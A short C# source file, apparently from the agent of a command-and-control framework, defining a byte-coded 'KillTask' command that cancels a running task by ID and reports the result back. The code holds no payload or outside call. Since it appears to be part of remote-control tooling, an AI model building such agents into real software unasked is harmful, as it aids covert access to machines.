using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class KillTask : DroneCommand
{
    public override byte Command => 0x21;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (Drone.CancelTask(task.Arguments[0]))
        {
            await Drone.SendTaskComplete(task);
            return;
        }

        await Drone.SendError(task, "Task ID not found.");
    }
}